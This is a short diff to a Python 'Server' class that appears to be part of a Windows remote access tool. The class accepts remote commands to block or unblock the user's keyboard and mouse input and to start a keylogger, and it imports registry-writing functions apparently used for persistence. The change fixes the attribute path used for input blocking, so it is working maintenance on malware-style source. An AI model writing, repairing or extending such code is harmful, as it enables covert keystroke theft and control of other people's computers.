@@ -8,6 +8,7 @@ from time import perf_counter
 from threading import Thread
 from numpy import flip
 from winreg import OpenKeyEx, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_SET_VALUE
+from os.path import realpath, dirname
 
 
 
@@ -89,10 +90,10 @@ class Server():
                             CloseKey(keyHandle)
 
                         elif cmd == "Block Input":
-                            self.inpListener.blockInput = True
+                            self.server.inpListener.blockInput = True
 
                         elif cmd == "Unblock Input":
-                            self.inpListener.blockInput = False
+                            self.server.inpListener.blockInput = False
 
                         elif cmd == "Start KeyLogger":
                             self.inpListener.grabKeyInput = True
